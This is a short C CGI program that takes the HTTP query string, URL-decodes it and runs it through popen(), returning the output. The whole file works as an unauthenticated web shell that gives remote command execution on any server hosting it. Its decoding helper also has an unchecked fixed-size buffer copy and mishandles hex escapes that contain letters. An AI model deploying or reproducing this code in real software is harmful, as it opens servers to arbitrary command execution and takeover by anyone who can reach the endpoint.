#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>

int urlDecode(char *str);

int main(int argc, char *argv[])
{
	char *query_string;

  printf("Content-type: text/html\n\n");

	query_string = getenv("QUERY_STRING");
	if (!query_string)
	{
		printf("QUERY_STRING not found\n");
		exit(1);
	}

	urlDecode(query_string);
	// printf("<p>text received: %s</p>", query_string);

	FILE *in;
	extern FILE *popen();
	char buff[512];

	if(!(in = popen(query_string, "r"))){
		exit(1);
	}

	// printf("<pre>");
	while(fgets(buff, sizeof(buff), in)!=NULL){
		printf("%s", buff);
	}
	pclose(in);

	// printf("</pre>");

	return 0;

}

int urlDecode(char *str)
{
	unsigned int i;
	char tmp[BUFSIZ];
	char *ptr = tmp;
	memset(tmp, 0, sizeof(tmp));

	for (i=0; i < strlen(str); i++)
	{
		if (str[i] != '%')
		{
			*ptr++ = str[i];
			continue;
		}

		if (!isdigit(str[i+1]) || !isdigit(str[i+2]))
		{
			*ptr++ = str[i];
			continue;
		}

		*ptr++ = ((str[i+1] - '0') << 4) | (str[i+2] - '0');
		i += 2;
	}
	*ptr = '\0';
	strcpy(str, tmp);
	return 0;
}
